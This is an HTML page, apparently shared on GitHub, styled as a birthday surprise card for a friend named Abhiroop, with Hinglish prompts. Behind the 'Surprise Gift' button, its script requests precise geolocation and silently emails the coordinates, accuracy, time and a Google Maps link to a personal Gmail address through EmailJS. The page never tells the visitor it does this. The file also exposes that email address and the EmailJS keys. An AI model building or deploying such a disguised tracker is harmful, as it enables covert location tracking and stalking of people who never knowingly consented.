[hbd.html](https://github.com/user-attachments/files/23692305/hbd.html)
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Location Share</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, #ff9a9e, #fad0c4, #ffe8a3);
      padding: 16px;
      transition: background 0.5s ease;
    }

    .card {
      background: rgba(255, 255, 255, 0.9);
      border-radius: 16px;
      padding: 24px 20px;
      max-width: 380px;
      width: 100%;
      text-align: center;
      box-shadow: 0 18px 40px rgba(0, 0, 0, 0.15);
      backdrop-filter: blur(10px);
      animation: cardPop 0.6s ease-out;
      transition: all 0.5s ease;
    }

    @keyframes cardPop {
      0% { transform: scale(0.9); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }

    h2 {
      font-size: 1.5rem;
      margin-bottom: 4px;
    }

    .subtitle {
      font-size: 0.9rem;
      color: #666;
      margin-bottom: 20px;
    }

    button {
      border: none;
      outline: none;
      padding: 12px 26px;
      border-radius: 999px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      background: linear-gradient(135deg, #ff6b6b, #f06595);
      color: white;
      box-shadow: 0 10px 20px rgba(240, 101, 149, 0.4);
      transition: transform 0.15s ease, box-shadow 0.15s ease, filter 0.15s ease;
      margin-bottom: 16px;
    }

    button:hover {
      transform: translateY(-2px) scale(1.03);
      box-shadow: 0 14px 26px rgba(240, 101, 149, 0.55);
      filter: brightness(1.05);
    }

    button:active {
      transform: translateY(1px) scale(0.97);
      box-shadow: 0 6px 14px rgba(240, 101, 149, 0.35);
      filter: brightness(0.97);
    }

    button.clicked {
      animation: btnPop 0.35s ease-out;
    }

    @keyframes btnPop {
      0% { transform: scale(0.9); }
      60% { transform: scale(1.08); }
      100% { transform: scale(1); }
    }

    #output {
      text-align: left;
      background: #f7f7ff;
      border-radius: 10px;
      padding: 12px 10px;
      font-size: 0.82rem;
      margin-top: 6px;
      max-height: 220px;
      overflow-y: auto;
      border: 1px solid rgba(0, 0, 0, 0.06);
      white-space: pre-wrap;
    }

    .hint {
      font-size: 0.78rem;
      color: #777;
      margin-top: 4px;
    }

    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #ff6b6b;
      border-radius: 50%;
      width: 20px;
      height: 20px;
      animation: spin 1s linear infinite;
      display: inline-block;
      margin-right: 8px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Happy Birthday Animation */
    .animation-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, #ff9a9e, #fad0c4, #ffe8a3);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.5s ease, visibility 0.5s ease;
    }

    .animation-container.show {
      opacity: 1;
      visibility: visible;
    }

    .birthday-text {
      font-size: 3rem;
      font-weight: bold;
      color: #ff6b6b;
      animation: bounce 2s infinite;
      margin-bottom: 20px;
    }

    @keyframes bounce {
      0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
      40% { transform: translateY(-30px); }
      60% { transform: translateY(-15px); }
    }

    .confetti {
      position: absolute;
      width: 10px;
      height: 10px;
      background: #ff6b6b;
      border-radius: 50%;
      animation: fall 3s linear infinite;
    }

    .confetti:nth-child(odd) {
      background: #f06595;
      animation-delay: 1s;
    }

    .confetti:nth-child(even) {
      background: #ffe8a3;
      animation-delay: 2s;
    }

    @keyframes fall {
      0% { transform: translateY(-100vh) rotate(0deg); }
      100% { transform: translateY(100vh) rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>🎂 Love You Bhai!</h2>
    <p class="subtitle">Ek chhota sa magic trick… button daba 😉</p>

    <button id="locBtn" onclick="getLocation()">Surprise Gift</button>

    <pre id="output"></pre>
    <p class="hint">
      Abe Paanji button ke bad agar popup aaye to <b>Allow</b> dabade bhai.
    </p>
  </div>

  <!-- Happy Birthday Animation Container -->
  <div class="animation-container" id="animation">
    <div class="birthday-text">🎉 Happy Birthday Abhiroop! 🎂</div>
    <!-- Confetti elements -->
    <div class="confetti" style="left: 10%; animation-duration: 3s;"></div>
    <div class="confetti" style="left: 20%; animation-duration: 4s;"></div>
    <div class="confetti" style="left: 30%; animation-duration: 3.5s;"></div>
    <div class="confetti" style="left: 40%; animation-duration: 4.5s;"></div>
    <div class="confetti" style="left: 50%; animation-duration: 3s;"></div>
    <div class="confetti" style="left: 60%; animation-duration: 4s;"></div>
    <div class="confetti" style="left: 70%; animation-duration: 3.5s;"></div>
    <div class="confetti" style="left: 80%; animation-duration: 4.5s;"></div>
    <div class="confetti" style="left: 90%; animation-duration: 3s;"></div>
  </div>

  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    const output = document.getElementById("output");
    const btn = document.getElementById("locBtn");
    const animation = document.getElementById("animation");

    // Initialize EmailJS with your public key
    emailjs.init("jQCoVV01Pk1zFkN5c"); // Your provided public key

    function getLocation() {
      if (!navigator.geolocation) {
        output.textContent = "Geolocation is not supported by this browser.";
        return;
      }

      // Button pop animation
      btn.classList.remove("clicked");
      void btn.offsetWidth; // reflow to restart animation
      btn.classList.add("clicked");

      output.innerHTML = '<div class="spinner"></div>...Please wait!';

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const { latitude, longitude, accuracy } = pos.coords;
          const time = new Date(pos.timestamp).toLocaleString();

          // Show the happy birthday animation
          animation.classList.add("show");

          // Prepare email content
          const emailParams = {
            to_email: "architpersonaluse@gmail.com", // Your Gmail
            subject: "Location Shared from Birthday Page",
            message: `
Location fetched ✅

Latitude: ${latitude}
Longitude: ${longitude}
Accuracy (meters): ${accuracy}
Time: ${time}

Google Maps Link:
https://www.google.com/maps?q=${latitude},${longitude}
            `
          };

          // Send email using EmailJS with your Service ID and Template ID
          emailjs.send("service_6c2obpm", "template_cpqcsum", emailParams)
            .then(() => {
              // Animation stays, but you can add a message if needed
              output.textContent = "Surprise sent! 🎉 Check your email for the location.";
            })
            .catch((error) => {
              output.textContent = "Error sending email: " + error.text + "\n\nFix: Ensure your EmailJS Service and Template IDs are correct.";
            });
        },
        (err) => {
          output.textContent =
            "Error while getting location ❌\n\n" +
            err.message +
            "\n\nEnsure:\n- Location is ON\n- Permission 'Allow' ki ho\n- Page https/localhost pe ho.";
        },
        {
          enableHighAccuracy: true,
          timeout: 10000, // Faster timeout
          maximumAge: 0
        }
      );
    }
  </script>
</body>
</html>
